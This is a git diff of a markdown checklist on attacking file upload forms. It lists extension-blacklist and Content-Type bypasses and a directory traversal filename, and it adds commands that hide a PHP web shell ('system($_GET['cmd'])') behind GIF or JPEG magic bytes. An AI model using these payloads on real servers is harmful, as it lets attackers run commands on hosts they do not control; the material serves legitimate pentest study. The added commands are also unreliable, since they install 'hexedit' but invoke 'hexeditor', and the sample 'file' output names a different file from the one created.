@@ -12,7 +12,6 @@
         - `PNG`, `JPEG`: Pixel flood attack (DoS)
         - `ZIP`: RCE via LFI, DoS
         - `PDF`, `PPTX`: SSRF, BLIND XXE
-
     - Bypass
         - [ ] Blacklisting Bypass
             - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
@@ -35,6 +34,7 @@
             - `file.php#.png`
             - `file.`
             - `.html`
+           
         - [ ] Content-ish Bypass
             - [ ]  Content-type validation
                 - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
@@ -52,27 +52,37 @@
             ```php
             GIF89a; <?php system($_GET['cmd']); ?>
             ```
-
+ 
         - [ ] Magic Number Bypass
             - Magic numbers are the first bits of a file which uniquely identify the type of file. it can be helpful to look for file format signatures and inferring how the application is using them based on these signatures, as well as how these formats may be abused to provoke undefined behavior within the application.
             - These bytes can be used by the system to “differentiate between and recognize different files” without a file extension.
             - Magic numbers (File signatures) are typically not visible to the user, but, can be seen by using a hex editor or by using the ‘xxd’ command to read the file
-            ```
-            xxd image.jpeg | head
+            ```bash
+            └─$ xxd image.jpeg | head
             ```
             - Download hex editor: To corrupt a file, we require a hex editor. hexedit is a popular tool used for the same. You can install it using:
-            ```
-            sudo apt-get install hexedit
+            ```bash
+            └─$ sudo apt-get install hexedit
             ```
             - You can open the file by typing
-            ```
-            hexedit image.png
+            ```bash
+            └─$ hexeditor image.png
             ```
             - To change a byte using hexedit, you simply have to move the cursor over a byte, and type what you would like to.
             - To save and exit, press ctrl X and then Y.
-            - echo -n -e '\xFF\xD8\xFF\n<?php system($_GET['cmd']); ?>'  > shell2.png.pHp 
-            - 
-         
+            - To make php file with jpg magic number use this code:
+            ```bash
+            └─$ echo -n -e '\xFF\xD8\xFF\xE0\n<?php system($_GET['cmd']); ?>'  > shell.jpg.pHp 
+            or
+            └─$ echo -e $'\xFF\xD8\xFF\xE0\n<?php system($_GET['cmd']); ?>'  > shell.jpg.pHp
+            ```
+            - You can also check it with this command:
+            ```bash
+            └─$ file shell.jpg.pHp
+            shell2.png.pHp: JPEG image data
+            ```
+            
+      </br>   
     - Vulnerabilities
         - [ ]  Directory Traversal
             - Set filename `../../etc/passwd/logo.png`
